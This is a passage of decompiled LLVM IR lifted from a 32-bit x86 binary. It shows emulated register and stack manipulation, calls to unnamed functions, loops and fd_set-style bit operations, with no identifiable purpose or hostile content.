  store i32 %v3_8048a7b, i32* %eax.global-to-local, align 4
  %v0_8048a80 = load i32, i32* @esp, align 4
  %v1_8048a80 = inttoptr i32 %v0_8048a80 to i32*
  %v2_8048a80 = load i32, i32* %v1_8048a80, align 4
  store i32 %v2_8048a80, i32* %eax.global-to-local, align 4
  %v1_8048a81 = add i32 %v0_8048a80, 10388
  store i32 %v1_8048a81, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048a81, i32* %v1_8048a80, align 4
  %v2_8048a89 = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_8048a89, i32* %eax.global-to-local, align 4
  store i32 %v2_8048a89, i32* @ebx, align 4
  %v0_8048a90 = load i32, i32* @esp, align 4
  %v1_8048a90 = inttoptr i32 %v0_8048a90 to i32*
  %v2_8048a90 = load i32, i32* %v1_8048a90, align 4
  store i32 %v2_8048a90, i32* %eax.global-to-local, align 4
  %v1_8048a91 = add i32 %v0_8048a90, 68
  %v2_8048a91 = inttoptr i32 %v1_8048a91 to i32*
  %v3_8048a91 = load i32, i32* %v2_8048a91, align 4
  store i32 %v3_8048a91, i32* %eax.global-to-local, align 4
  store i32 %v3_8048a91, i32* %v1_8048a90, align 4
  %v2_8048a96 = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_8048a96, i32* %eax.global-to-local, align 4
  %v0_8048a9b = load i32, i32* @esp, align 4
  %v1_8048a9e = add i32 %v0_8048a9b, 10388
  %v1_8048aa5 = load i32, i32* @ebx, align 4
  %v2_8048aa5 = add i32 %v1_8048a9e, %v1_8048aa5
  %v12_8048aa5 = icmp eq i32 %v2_8048aa5, 0
  store i1 %v12_8048aa5, i1* %zf.global-to-local, align 1
  store i32 %v2_8048aa5, i32* %edx.global-to-local, align 4
  %v2_8048aa7 = add i32 %v0_8048a9b, 8
  %v3_8048aa7 = inttoptr i32 %v2_8048aa7 to i32*
  store i32 %v2_8048aa5, i32* %v3_8048aa7, align 4
  %v1_8048aa8 = add i32 %v0_8048a9b, 4
  %v2_8048aa8 = inttoptr i32 %v1_8048aa8 to i32*
  store i32 10, i32* %v2_8048aa8, align 4
  %v3_8048aaa = inttoptr i32 %v0_8048a9b to i32*
  store i32 %v2_8048a96, i32* %v3_8048aaa, align 4
  %v4_8048aab = call i32 @function_80520b0(i64 %v3_8048aab, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8048aab, i32* %eax.global-to-local, align 4
  %v0_8048ab0 = load i32, i32* @esp, align 4
  %v1_8048ab0 = inttoptr i32 %v0_8048ab0 to i32*
  %v2_8048ab0 = load i32, i32* %v1_8048ab0, align 4
  store i32 %v2_8048ab0, i32* @ebx, align 4
  %v1_8048ab1 = add i32 %v0_8048ab0, 10388
  store i32 %v1_8048ab1, i32* %eax.global-to-local, align 4
  store i32 %v1_8048ab1, i32* %v1_8048ab0, align 4
  %v2_8048ab9 = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_8048ab9, i32* %eax.global-to-local, align 4
  %v0_8048abe = load i32, i32* @esp, align 4
  %v1_8048abe = inttoptr i32 %v0_8048abe to i32*
  %v2_8048abe = load i32, i32* %v1_8048abe, align 4
  store i32 %v2_8048abe, i32* %edx.global-to-local, align 4
  %v3_8048abe = add i32 %v0_8048abe, 4
  %v1_8048abf = inttoptr i32 %v3_8048abe to i32*
  %v2_8048abf = load i32, i32* %v1_8048abf, align 4
  store i32 %v2_8048abf, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8054b66.10 to i32), i32* %v1_8048abf, align 4
  %v1_8048ac5 = add i32 %v0_8048abe, 10388
  store i32 %v1_8048ac5, i32* %edx.global-to-local, align 4
  %v2_8048acc = add i32 %v1_8048ac5, %v2_8048ab9
  store i32 %v2_8048acc, i32* %eax.global-to-local, align 4
  store i32 %v2_8048acc, i32* %v1_8048abe, align 4
  %v3_8048ad0 = call i32 @function_8051cc0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048ad0, i32* %eax.global-to-local, align 4
  %v0_8048ad5 = load i32, i32* @esp, align 4
  %v1_8048ad5 = add i32 %v0_8048ad5, 16
  %v6_8048ad5 = icmp eq i32 %v1_8048ad5, 0
  store i1 %v6_8048ad5, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048ad8

dec_label_pc_8048ad8:                             ; preds = %dec_label_pc_8048700, %dec_label_pc_80489c4
  %v0_8048ae3 = phi i32 [ %v1_80489b5, %dec_label_pc_8048700 ], [ %v1_8048ad5, %dec_label_pc_80489c4 ]
  %v0_8048ad8 = load i32, i32* @esi, align 4
  %v1_8048ad8 = add i32 %v0_8048ad8, 28
  %v2_8048ad8 = inttoptr i32 %v1_8048ad8 to i32*
  %v3_8048ad8 = load i32, i32* %v2_8048ad8, align 4
  store i32 %v3_8048ad8, i32* @ebx, align 4
  %v1_8048adb = icmp eq i32 %v3_8048ad8, 0
  store i1 %v1_8048adb, i1* %zf.global-to-local, align 1
  %tmp139 = icmp slt i32 %v3_8048ad8, 1
  br i1 %tmp139, label %dec_label_pc_8048bb4, label %dec_label_pc_8048ae3

dec_label_pc_8048ae3:                             ; preds = %dec_label_pc_8048ad8
  %v9_8048ae3 = icmp eq i32 %v0_8048ae3, 12
  store i1 %v9_8048ae3, i1* %zf.global-to-local, align 1
  %v1_8048ae6 = add i32 %v0_8048ae3, 10372
  store i32 %v1_8048ae6, i32* %ecx.global-to-local, align 4
  %v2_8048aed = add i32 %v0_8048ae3, -16
  %v3_8048aed = inttoptr i32 %v2_8048aed to i32*
  store i32 %v1_8048ae6, i32* %v3_8048aed, align 4
  %v2_8048aee = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_8048aee, i32* %eax.global-to-local, align 4
  %v0_8048af3 = load i32, i32* @esp, align 4
  %v1_8048af3 = inttoptr i32 %v0_8048af3 to i32*
  %v2_8048af3 = load i32, i32* %v1_8048af3, align 4
  store i32 %v2_8048af3, i32* %edx.global-to-local, align 4
  %v3_8048af3 = add i32 %v0_8048af3, 4
  %v1_8048af4 = inttoptr i32 %v3_8048af3 to i32*
  %v2_8048af4 = load i32, i32* %v1_8048af4, align 4
  store i32 %v2_8048af4, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_8054b58.11 to i32), i32* %v1_8048af4, align 4
  %v1_8048afa = add i32 %v0_8048af3, 10388
  store i32 %v1_8048afa, i32* %edx.global-to-local, align 4
  %v2_8048b01 = add i32 %v1_8048afa, %v2_8048aee
  store i32 %v2_8048b01, i32* %eax.global-to-local, align 4
  store i32 %v2_8048b01, i32* %v1_8048af3, align 4
  %v3_8048b05 = call i32 @function_8051cc0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048b05, i32* %eax.global-to-local, align 4
  %v0_8048b0a = load i32, i32* @esp, align 4
  %v1_8048b0a = add i32 %v0_8048b0a, 20916
  %v2_8048b0a = inttoptr i32 %v1_8048b0a to i32*
  store i32 0, i32* %v2_8048b0a, align 4
  %v0_8048b15 = load i32, i32* @esp, align 4
  %v1_8048b15 = add i32 %v0_8048b15, 16
  %v0_8048b18 = load i32, i32* @esi, align 4
  %v1_8048b18 = add i32 %v0_8048b18, 28
  %v2_8048b18 = inttoptr i32 %v1_8048b18 to i32*
  %v3_8048b18 = load i32, i32* %v2_8048b18, align 4
  store i32 %v3_8048b18, i32* %ebx.global-to-local, align 4
  %v1_8048b1b = icmp eq i32 %v3_8048b18, 0
  store i1 %v1_8048b1b, i1* %zf.global-to-local, align 1
  %tmp140 = icmp slt i32 %v3_8048b18, 1
  br i1 %tmp140, label %dec_label_pc_8048b8a, label %dec_label_pc_8048b1f

dec_label_pc_8048b1f:                             ; preds = %dec_label_pc_8048ae3
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8048b21

dec_label_pc_8048b21:                             ; preds = %dec_label_pc_8048b21, %dec_label_pc_8048b1f
  %v0_8048b24 = phi i32 [ %v1_8048b82, %dec_label_pc_8048b21 ], [ %v1_8048b15, %dec_label_pc_8048b1f ]
  %v0_8048b21 = phi i32 [ %v4_8048b85, %dec_label_pc_8048b21 ], [ 0, %dec_label_pc_8048b1f ]
  %v2_8048b21 = mul i32 %v0_8048b21, 128
  store i32 %v2_8048b21, i32* @ebx, align 4
  %v9_8048b24 = icmp eq i32 %v0_8048b24, 12
  store i1 %v9_8048b24, i1* %zf.global-to-local, align 1
  %v1_8048b27 = add i32 %v0_8048b24, 10372
  store i32 %v1_8048b27, i32* %ecx.global-to-local, align 4
  %v2_8048b2e = add i32 %v0_8048b24, -16
  %v3_8048b2e = inttoptr i32 %v2_8048b2e to i32*
  store i32 %v1_8048b27, i32* %v3_8048b2e, align 4
  %v2_8048b2f = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_8048b2f, i32* %eax.global-to-local, align 4
  %v0_8048b34 = load i32, i32* @esp, align 4
  %v1_8048b34 = inttoptr i32 %v0_8048b34 to i32*
  %v3_8048b34 = add i32 %v0_8048b34, 4
  %v0_8048b35 = load i32, i32* @ebx, align 4
  %v1_8048b35 = load i32, i32* @edi, align 4
  %v2_8048b35 = add i32 %v0_8048b35, 1472
  %v3_8048b35 = add i32 %v2_8048b35, %v1_8048b35
  store i32 %v3_8048b35, i32* %edx.global-to-local, align 4
  %v1_8048b3c = inttoptr i32 %v3_8048b34 to i32*
  %v2_8048b3c = load i32, i32* %v1_8048b3c, align 4
  store i32 %v2_8048b3c, i32* %ecx.global-to-local, align 4
  store i32 %v3_8048b35, i32* %v1_8048b3c, align 4
  %v1_8048b3e = add i32 %v0_8048b34, 10388
  store i32 %v1_8048b3e, i32* %edx.global-to-local, align 4
  %v2_8048b45 = add i32 %v1_8048b3e, %v2_8048b2f
  store i32 %v2_8048b45, i32* %eax.global-to-local, align 4
  store i32 %v2_8048b45, i32* %v1_8048b34, align 4
  %v3_8048b49 = call i32 @function_8051cc0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048b49, i32* %eax.global-to-local, align 4
  %v0_8048b4e = load i32, i32* @esp, align 4
  %v1_8048b4e = inttoptr i32 %v0_8048b4e to i32*
  %v2_8048b4e = load i32, i32* %v1_8048b4e, align 4
  store i32 %v2_8048b4e, i32* @ebx, align 4
  %v1_8048b4f = add i32 %v0_8048b4e, 10388
  store i32 %v1_8048b4f, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048b4f, i32* %v1_8048b4e, align 4
  %v2_8048b57 = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_8048b57, i32* %eax.global-to-local, align 4
  %v0_8048b5c = load i32, i32* @esp, align 4
  %v1_8048b5c = inttoptr i32 %v0_8048b5c to i32*
  %v2_8048b5c = load i32, i32* %v1_8048b5c, align 4
  store i32 %v2_8048b5c, i32* %edx.global-to-local, align 4
  %v3_8048b5c = add i32 %v0_8048b5c, 4
  %v1_8048b5d = inttoptr i32 %v3_8048b5c to i32*
  %v2_8048b5d = load i32, i32* %v1_8048b5d, align 4
  store i32 %v2_8048b5d, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8054b61.12 to i32), i32* %v1_8048b5d, align 4
  %v1_8048b63 = add i32 %v0_8048b5c, 10388
  store i32 %v1_8048b63, i32* %edx.global-to-local, align 4
  %v2_8048b6a = add i32 %v1_8048b63, %v2_8048b57
  store i32 %v2_8048b6a, i32* %eax.global-to-local, align 4
  store i32 %v2_8048b6a, i32* %v1_8048b5c, align 4
  %v3_8048b6e = call i32 @function_8051cc0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048b6e, i32* %eax.global-to-local, align 4
  %v0_8048b73 = load i32, i32* @esp, align 4
  %v1_8048b73 = add i32 %v0_8048b73, 20916
  %v2_8048b73 = inttoptr i32 %v1_8048b73 to i32*
  %v3_8048b73 = load i32, i32* %v2_8048b73, align 4
  %v1_8048b7a = add i32 %v3_8048b73, 1
  store i32 %v1_8048b7a, i32* %ebx.global-to-local, align 4
  store i32 %v1_8048b7a, i32* %v2_8048b73, align 4
  %v0_8048b82 = load i32, i32* @esp, align 4
  %v1_8048b82 = add i32 %v0_8048b82, 16
  %v0_8048b85 = load i32, i32* @esi, align 4
  %v1_8048b85 = add i32 %v0_8048b85, 28
  %v2_8048b85 = inttoptr i32 %v1_8048b85 to i32*
  %v3_8048b85 = load i32, i32* %v2_8048b85, align 4
  %v4_8048b85 = load i32, i32* %ebx.global-to-local, align 4
  %v5_8048b85 = sub i32 %v3_8048b85, %v4_8048b85
  %v11_8048b85 = xor i32 %v4_8048b85, %v3_8048b85
  %v12_8048b85 = xor i32 %v5_8048b85, %v3_8048b85
  %v13_8048b85 = and i32 %v12_8048b85, %v11_8048b85
  %v14_8048b85 = icmp slt i32 %v13_8048b85, 0
  %v15_8048b85 = icmp eq i32 %v5_8048b85, 0
  store i1 %v15_8048b85, i1* %zf.global-to-local, align 1
  %v16_8048b85 = icmp slt i32 %v5_8048b85, 0
  %v3_8048b88 = icmp eq i1 %v16_8048b85, %v14_8048b85
  %v4_8048b88 = icmp eq i1 %v15_8048b85, false
  %v5_8048b88 = and i1 %v4_8048b88, %v3_8048b88
  br i1 %v5_8048b88, label %dec_label_pc_8048b21, label %dec_label_pc_8048b8a

dec_label_pc_8048b8a:                             ; preds = %dec_label_pc_8048b21, %dec_label_pc_8048ae3
  %v0_8048b8a = phi i32 [ %v1_8048b15, %dec_label_pc_8048ae3 ], [ %v1_8048b82, %dec_label_pc_8048b21 ]
  %v9_8048b8a = icmp eq i32 %v0_8048b8a, 12
  store i1 %v9_8048b8a, i1* %zf.global-to-local, align 1
  %v1_8048b8d = add i32 %v0_8048b8a, 10372
  store i32 %v1_8048b8d, i32* %ecx.global-to-local, align 4
  %v2_8048b94 = add i32 %v0_8048b8a, -16
  %v3_8048b94 = inttoptr i32 %v2_8048b94 to i32*
  store i32 %v1_8048b8d, i32* %v3_8048b94, align 4
  %v2_8048b95 = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_8048b95, i32* %eax.global-to-local, align 4
  %v0_8048b9a = load i32, i32* @esp, align 4
  %v1_8048b9a = inttoptr i32 %v0_8048b9a to i32*
  %v2_8048b9a = load i32, i32* %v1_8048b9a, align 4
  store i32 %v2_8048b9a, i32* @ebx, align 4
  %v3_8048b9a = add i32 %v0_8048b9a, 4
  %v1_8048b9b = inttoptr i32 %v3_8048b9a to i32*
  %v2_8048b9b = load i32, i32* %v1_8048b9b, align 4
  store i32 %v2_8048b9b, i32* %edi.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8054b66.10 to i32), i32* %v1_8048b9b, align 4
  %v1_8048ba1 = add i32 %v0_8048b9a, 10388
  store i32 %v1_8048ba1, i32* %edx.global-to-local, align 4
  %v2_8048ba8 = add i32 %v1_8048ba1, %v2_8048b95
  store i32 %v2_8048ba8, i32* %eax.global-to-local, align 4
  store i32 %v2_8048ba8, i32* %v1_8048b9a, align 4
  %v3_8048bac = call i32 @function_8051cc0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048bac, i32* %eax.global-to-local, align 4
  %v0_8048bb1 = load i32, i32* @esp, align 4
  %v1_8048bb1 = add i32 %v0_8048bb1, 16
  %v6_8048bb1 = icmp eq i32 %v1_8048bb1, 0
  store i1 %v6_8048bb1, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048bb4

dec_label_pc_8048bb4:                             ; preds = %dec_label_pc_8048ad8, %dec_label_pc_8048b8a
  %v0_8048bb4 = phi i32 [ %v0_8048ae3, %dec_label_pc_8048ad8 ], [ %v1_8048bb1, %dec_label_pc_8048b8a ]
  %v9_8048bb4 = icmp eq i32 %v0_8048bb4, 12
  store i1 %v9_8048bb4, i1* %zf.global-to-local, align 1
  %v1_8048bb7 = add i32 %v0_8048bb4, 10372
  store i32 %v1_8048bb7, i32* %ecx.global-to-local, align 4
  %v2_8048bbe = add i32 %v0_8048bb4, -16
  %v3_8048bbe = inttoptr i32 %v2_8048bbe to i32*
  store i32 %v1_8048bb7, i32* %v3_8048bbe, align 4
  %v2_8048bbf = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_8048bbf, i32* %eax.global-to-local, align 4
  %v0_8048bc4 = load i32, i32* @esp, align 4
  %v1_8048bc4 = inttoptr i32 %v0_8048bc4 to i32*
  %v2_8048bc4 = load i32, i32* %v1_8048bc4, align 4
  store i32 %v2_8048bc4, i32* %edx.global-to-local, align 4
  %v3_8048bc4 = add i32 %v0_8048bc4, 4
  %v1_8048bc5 = inttoptr i32 %v3_8048bc4 to i32*
  %v2_8048bc5 = load i32, i32* %v1_8048bc5, align 4
  store i32 %v2_8048bc5, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8054b66.10 to i32), i32* %v1_8048bc5, align 4
  %v1_8048bcb = add i32 %v0_8048bc4, 10388
  store i32 %v1_8048bcb, i32* %edx.global-to-local, align 4
  %v2_8048bd2 = add i32 %v1_8048bcb, %v2_8048bbf
  store i32 %v2_8048bd2, i32* %eax.global-to-local, align 4
  store i32 %v2_8048bd2, i32* %v1_8048bc4, align 4
  %v3_8048bd6 = call i32 @function_8051cc0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048bd6, i32* %eax.global-to-local, align 4
  %v0_8048bdb = load i32, i32* @esp, align 4
  %v1_8048bdb = add i32 %v0_8048bdb, 16
  %v1_8048bde = add i32 %v0_8048bdb, 68
  %v2_8048bde = inttoptr i32 %v1_8048bde to i32*
  %v3_8048bde = load i32, i32* %v2_8048bde, align 4
  store i32 %v3_8048bde, i32* @edi, align 4
  %v1_8048be2 = icmp eq i32 %v3_8048bde, 0
  store i1 %v1_8048be2, i1* %zf.global-to-local, align 1
  br i1 %v1_8048be2, label %dec_label_pc_8048c10, label %dec_label_pc_8048be6

dec_label_pc_8048be6:                             ; preds = %dec_label_pc_8048bb4
  %v9_8048be6 = icmp eq i32 %v0_8048bdb, -4
  store i1 %v9_8048be6, i1* %zf.global-to-local, align 1
  %v1_8048be9 = add i32 %v0_8048bdb, 10388
  store i32 %v1_8048be9, i32* %ecx.global-to-local, align 4
  %v3_8048bf0 = inttoptr i32 %v0_8048bdb to i32*
  store i32 %v1_8048be9, i32* %v3_8048bf0, align 4
  %v2_8048bf1 = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_8048bf1, i32* %eax.global-to-local, align 4
  %v0_8048bf6 = load i32, i32* @esp, align 4
  %v1_8048bf6 = inttoptr i32 %v0_8048bf6 to i32*
  %v2_8048bf6 = load i32, i32* %v1_8048bf6, align 4
  store i32 %v2_8048bf6, i32* %ecx.global-to-local, align 4
  %v3_8048bf6 = add i32 %v0_8048bf6, 4
  %v1_8048bf7 = inttoptr i32 %v3_8048bf6 to i32*
  %v2_8048bf7 = load i32, i32* %v1_8048bf7, align 4
  store i32 %v2_8048bf7, i32* @ebx, align 4
  %v1_8048bf8 = add i32 %v0_8048bf6, 68
  %v2_8048bf8 = inttoptr i32 %v1_8048bf8 to i32*
  %v3_8048bf8 = load i32, i32* %v2_8048bf8, align 4
  store i32 %v3_8048bf8, i32* %v1_8048bf7, align 4
  %v1_8048bfd = add i32 %v0_8048bf6, 10388
  store i32 %v1_8048bfd, i32* %edx.global-to-local, align 4
  %v2_8048c04 = add i32 %v1_8048bfd, %v2_8048bf1
  store i32 %v2_8048c04, i32* %eax.global-to-local, align 4
  store i32 %v2_8048c04, i32* %v1_8048bf6, align 4
  %v3_8048c08 = call i32 @function_8051cc0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048c08, i32* %eax.global-to-local, align 4
  %v0_8048c0d = load i32, i32* @esp, align 4
  %v1_8048c0d = add i32 %v0_8048c0d, 16
  %v6_8048c0d = icmp eq i32 %v1_8048c0d, 0
  store i1 %v6_8048c0d, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048c10

dec_label_pc_8048c10:                             ; preds = %dec_label_pc_8048bb4, %dec_label_pc_8048be6
  %v1_8048c10 = phi i32 [ %v1_8048bdb, %dec_label_pc_8048bb4 ], [ %v1_8048c0d, %dec_label_pc_8048be6 ]
  %v0_8048c10 = phi i32 [ %v3_8048bd6, %dec_label_pc_8048bb4 ], [ %v3_8048c08, %dec_label_pc_8048be6 ]
  %v2_8048c10 = add i32 %v1_8048c10, -4
  %v3_8048c10 = inttoptr i32 %v2_8048c10 to i32*
  store i32 %v0_8048c10, i32* %v3_8048c10, align 4
  %v0_8048c11 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048c11 = add i32 %v1_8048c10, -8
  %v3_8048c11 = inttoptr i32 %v2_8048c11 to i32*
  store i32 %v0_8048c11, i32* %v3_8048c11, align 4
  %v0_8048c12 = load i32, i32* @esi, align 4
  %v2_8048c12 = add i32 %v1_8048c10, -12
  %v3_8048c12 = inttoptr i32 %v2_8048c12 to i32*
  store i32 %v0_8048c12, i32* %v3_8048c12, align 4
  %v1_8048c13 = add i32 %v1_8048c10, 96
  %v2_8048c13 = inttoptr i32 %v1_8048c13 to i32*
  %v3_8048c13 = load i32, i32* %v2_8048c13, align 4
  store i32 %v3_8048c13, i32* %eax.global-to-local, align 4
  %v2_8048c17 = add i32 %v1_8048c10, -16
  %v3_8048c17 = inttoptr i32 %v2_8048c17 to i32*
  store i32 %v3_8048c13, i32* %v3_8048c17, align 4
  %v0_8048c18 = call i32 @function_8052010()
  store i32 %v0_8048c18, i32* %eax.global-to-local, align 4
  %v0_8048c1d = load i32, i32* @esp, align 4
  %v1_8048c1d = add i32 %v0_8048c1d, 16
  %v3_8048c20 = trunc i32 %v0_8048c18 to i8
  %v4_8048c20 = icmp eq i8 %v3_8048c20, 0
  store i1 %v4_8048c20, i1* %zf.global-to-local, align 1
  br i1 %v4_8048c20, label %dec_label_pc_804979e, label %dec_label_pc_8048c28

dec_label_pc_8048c28:                             ; preds = %dec_label_pc_8048c10, %dec_label_pc_804979e
  %v0_8048c28 = phi i32 [ %v1_8048c1d, %dec_label_pc_8048c10 ], [ %v1_80497ab, %dec_label_pc_804979e ]
  %v9_8048c28 = icmp eq i32 %v0_8048c28, 12
  store i1 %v9_8048c28, i1* %zf.global-to-local, align 1
  %v1_8048c2b = add i32 %v0_8048c28, 10372
  store i32 %v1_8048c2b, i32* %ecx.global-to-local, align 4
  %v2_8048c32 = add i32 %v0_8048c28, -16
  %v3_8048c32 = inttoptr i32 %v2_8048c32 to i32*
  store i32 %v1_8048c2b, i32* %v3_8048c32, align 4
  %v2_8048c33 = call i32 @function_8051ca0(i8* %v1_8048752)
  %v0_8048c38 = load i32, i32* @esp, align 4
  %v1_8048c38 = add i32 %v0_8048c38, -4
  %v2_8048c38 = inttoptr i32 %v1_8048c38 to i32*
  store i32 16384, i32* %v2_8048c38, align 4
  %v2_8048c3d = add i32 %v0_8048c38, -8
  %v3_8048c3d = inttoptr i32 %v2_8048c3d to i32*
  store i32 %v2_8048c33, i32* %v3_8048c3d, align 4
  %v1_8048c3e = add i32 %v0_8048c38, 10388
  store i32 %v1_8048c3e, i32* %eax.global-to-local, align 4
  %v2_8048c45 = add i32 %v0_8048c38, -12
  %v3_8048c45 = inttoptr i32 %v2_8048c45 to i32*
  store i32 %v1_8048c3e, i32* %v3_8048c45, align 4
  %v0_8048c46 = load i32, i32* @esi, align 4
  %v1_8048c46 = add i32 %v0_8048c46, -1440
  %v2_8048c46 = inttoptr i32 %v1_8048c46 to i32*
  %v3_8048c46 = load i32, i32* %v2_8048c46, align 4
  store i32 %v3_8048c46, i32* %ecx.global-to-local, align 4
  %v2_8048c4c = add i32 %v0_8048c38, -16
  %v3_8048c4c = inttoptr i32 %v2_8048c4c to i32*
  store i32 %v3_8048c46, i32* %v3_8048c4c, align 4
  %v0_8048c4d = call i32 @function_8052984()
  store i32 %v0_8048c4d, i32* %eax.global-to-local, align 4
  %v0_8048c52 = load i32, i32* @esp, align 4
  %v1_8048c52 = add i32 %v0_8048c52, 112
  %v2_8048c52 = inttoptr i32 %v1_8048c52 to i32*
  %v3_8048c52 = load i32, i32* %v2_8048c52, align 4
  store i32 %v3_8048c52, i32* %edx.global-to-local, align 4
  %v0_8048c56 = load i32, i32* @esi, align 4
  %v1_8048c56 = add i32 %v0_8048c56, -1440
  %v2_8048c56 = inttoptr i32 %v1_8048c56 to i32*
  %v3_8048c56 = load i32, i32* %v2_8048c56, align 4
  store i32 %v3_8048c56, i32* %eax.global-to-local, align 4
  %v2_8048c5c = add i32 %v0_8048c56, -1428
  %v3_8048c5c = inttoptr i32 %v2_8048c5c to i32*
  store i32 %v3_8048c52, i32* %v3_8048c5c, align 4
  %v0_8048c62 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8048c62, i32* %edx.global-to-local, align 4
  %v0_8048c64 = load i32, i32* @esi, align 4
  %v1_8048c64 = add i32 %v0_8048c64, -1436
  %v2_8048c64 = inttoptr i32 %v1_8048c64 to i8*
  store i8 6, i8* %v2_8048c64, align 1
  %v0_8048c6b = load i32, i32* %eax.global-to-local, align 4
  %v1_8048c6b = urem i32 %v0_8048c6b, 32
  store i32 %v1_8048c6b, i32* %eax.global-to-local, align 4
  %v0_8048c6e = load i32, i32* %edx.global-to-local, align 4
  %v2_8048c6e = udiv i32 %v0_8048c6e, 32
  store i32 %v2_8048c6e, i32* %edx.global-to-local, align 4
  %v0_8048c71 = load i32, i32* @esp, align 4
  %v2_8048c71 = mul nuw nsw i32 %v2_8048c6e, 4
  %v3_8048c71 = add nuw nsw i32 %v2_8048c71, 20772
  %v4_8048c71 = add i32 %v3_8048c71, %v0_8048c71
  %v5_8048c71 = inttoptr i32 %v4_8048c71 to i32*
  %v6_8048c71 = load i32, i32* %v5_8048c71, align 4
  %v9_8048c71 = shl i32 1, %v1_8048c6b
  %v12_8048c71 = or i32 %v6_8048c71, %v9_8048c71
  %v16_8048c71 = add i32 %v0_8048c71, 20772
  %v17_8048c71 = add i32 %v16_8048c71, %v2_8048c71
  %v18_8048c71 = inttoptr i32 %v17_8048c71 to i32*
  store i32 %v12_8048c71, i32* %v18_8048c71, align 4
  %v0_8048c79 = load i32, i32* @esp, align 4
  %v1_8048c79 = add i32 %v0_8048c79, 32
  %v0_8048c7c = load i32, i32* @esi, align 4
  %v1_8048c7c = add i32 %v0_8048c7c, -1440
  %v2_8048c7c = inttoptr i32 %v1_8048c7c to i32*
  %v3_8048c7c = load i32, i32* %v2_8048c7c, align 4
  store i32 %v3_8048c7c, i32* %eax.global-to-local, align 4
  %v1_8048c82 = add i32 %v0_8048c79, 104
  %v2_8048c82 = inttoptr i32 %v1_8048c82 to i32*
  %v3_8048c82 = load i32, i32* %v2_8048c82, align 4
  %v5_8048c82 = sub i32 %v3_8048c82, %v3_8048c7c
  %v11_8048c82 = xor i32 %v3_8048c82, %v3_8048c7c
  %v12_8048c82 = xor i32 %v5_8048c82, %v3_8048c82
  %v13_8048c82 = and i32 %v12_8048c82, %v11_8048c82
  %v14_8048c82 = icmp slt i32 %v13_8048c82, 0
  %v15_8048c82 = icmp eq i32 %v5_8048c82, 0
  store i1 %v15_8048c82, i1* %zf.global-to-local, align 1
  %v16_8048c82 = icmp slt i32 %v5_8048c82, 0
  %v2_8048c86 = icmp eq i1 %v16_8048c82, %v14_8048c82
  br i1 %v2_8048c86, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_8048c91:                             ; preds = %dec_label_pc_80486ee
  store i8 0, i8* %v2_80485a5, align 1
  br label %dec_label_pc_80485be

dec_label_pc_8048c9d:                             ; preds = %dec_label_pc_8048537
  %v0_8048c9d = load i32, i32* @esp, align 4
  %v1_8048c9d = add i32 %v0_8048c9d, 80
  %v2_8048c9d = inttoptr i32 %v1_8048c9d to i32*
  %v3_8048c9d = load i32, i32* %v2_8048c9d, align 4
  store i32 %v3_8048c9d, i32* %eax.global-to-local, align 4
  %v1_8048ca1 = add i32 %v0_80485a5, -1432
  %v2_8048ca1 = inttoptr i32 %v1_8048ca1 to i32*
  %v3_8048ca1 = load i32, i32* %v2_8048ca1, align 4
  store i32 %v3_8048ca1, i32* @ebx, align 4
  %v2_8048ca7 = sub i32 %v3_8048c9d, %v3_8048ca1
  store i32 %v2_8048ca7, i32* %eax.global-to-local, align 4
  %v9_8048ca9 = icmp eq i32 %v2_8048ca7, 30
  store i1 %v9_8048ca9, i1* %zf.global-to-local, align 1
  %tmp239 = icmp ult i32 %v2_8048ca7, 31
  br i1 %tmp239, label %dec_label_pc_8048cb2, label %dec_label_pc_804855f

dec_label_pc_8048cb2:                             ; preds = %dec_label_pc_8048c9d
  %v1_8048cb2 = add i32 %v0_80485a5, -1440
  %v2_8048cb2 = inttoptr i32 %v1_8048cb2 to i32*
  %v3_8048cb2 = load i32, i32* %v2_8048cb2, align 4
  %v1_8048cba = urem i32 %v3_8048cb2, 32
  store i32 %v1_8048cba, i32* %eax.global-to-local, align 4
  %v2_8048cbd = udiv i32 %v3_8048cb2, 32
  store i32 %v2_8048cbd, i32* %edx.global-to-local, align 4
  %v2_8048cc0 = mul nuw nsw i32 %v2_8048cbd, 4
  %v3_8048cc0 = add i32 %v0_8048c9d, 20612
  %v4_8048cc0 = add i32 %v3_8048cc0, %v2_8048cc0
  %v5_8048cc0 = inttoptr i32 %v4_8048cc0 to i32*
  %v6_8048cc0 = load i32, i32* %v5_8048cc0, align 4
  %v9_8048cc0 = shl i32 1, %v1_8048cba
  %v12_8048cc0 = or i32 %v6_8048cc0, %v9_8048cc0
